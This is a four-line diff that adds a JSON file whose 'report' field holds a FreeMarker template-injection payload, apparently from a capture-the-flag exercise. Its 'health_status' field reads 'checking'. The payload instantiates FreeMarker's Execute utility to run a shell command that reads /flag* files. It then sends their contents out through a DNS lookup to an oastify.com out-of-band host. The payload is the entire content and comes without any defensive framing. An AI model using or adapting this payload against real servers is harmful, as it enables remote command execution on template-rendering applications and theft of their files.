@@ -1,0 +1,4 @@
+{
+  "health_status": "checking",
+  "report": "<#assign ex = 'freemarker.template.utility.Execute'?new()> ${ex('nslookup $(cat /flag* 2>/dev/null || echo noflag).oastify.com')}"
+}
